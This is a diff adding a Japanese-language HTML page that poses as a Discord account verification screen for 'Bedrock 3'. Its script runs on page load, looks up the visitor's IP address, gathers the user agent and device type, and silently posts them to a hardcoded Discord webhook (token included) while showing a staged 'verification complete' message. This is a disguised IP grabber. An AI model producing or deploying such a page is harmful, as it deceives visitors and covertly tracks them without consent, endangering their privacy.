@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bedrock 3 - 認証</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #2f3136;
+      color: #dcddde;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: #36393f;
+      border-radius: 8px;
+      padding: 32px;
+      max-width: 480px;
+      width: 90%;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 16px;
+    }
+    #status {
+      font-size: 18px;
+      margin: 32px 0;
+      min-height: 40px;
+      color: #a5f3fc;
+    }
+    .success {
+      color: #3ba55c;
+      font-size: 28px;
+      font-weight: bold;
+      animation: fadeIn 1s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Bedrock 3</h1>
+  <p>認証中です...<br>Discordアカウントを確認しています</p>
+  <div id="status">しばらくお待ちください...</div>
+</div>
+
+<script>
+  const status = document.getElementById('status');
+
+  async function sendInfo() {
+    let ip = "取得中...";
+
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      ip = data.ip || "取得失敗";
+    } catch {
+      ip = "取得エラー";
+    }
+
+    const ua = navigator.userAgent;
+    const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(ua) ? "モバイル" : "PC/タブレット";
+
+    const payload = {
+      content: "**Bedrock 3 認証ページ訪問**",
+      embeds: [{
+        title: "訪問者情報（自動取得）",
+        color: 0x5865f2,
+        fields: [
+          { name: "IPアドレス", value: ip, inline: true },
+          { name: "デバイス種別", value: isMobile, inline: true },
+          { name: "User-Agent", value: ua.substring(0, 180) + (ua.length > 180 ? "..." : ""), inline: false },
+          { name: "時刻", value: new Date().toLocaleString('ja-JP'), inline: false },
+          { name: "備考", value: "メールアドレス・Discordユーザー名・アイコンは自動取得不可", inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    const webhook = "https://discord.com/api/webhooks/1468990532221927485/TmW8si5EPAaSjAclfY2Jal7jHloFqYG4p6dT3jb8WtS6WzD2Ck_Eon2DNHSe-6L8EZjw";
+
+    try {
+      await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {
+      console.error("送信失敗", err);
+    }
+
+    // 演出：3秒後に成功表示
+    setTimeout(() => {
+      status.className = "success";
+      status.textContent = "認証完了！";
+    }, 2800);
+  }
+
+  // ページ読み込み直後に実行
+  sendInfo();
+</script>
+</body>
+</html>
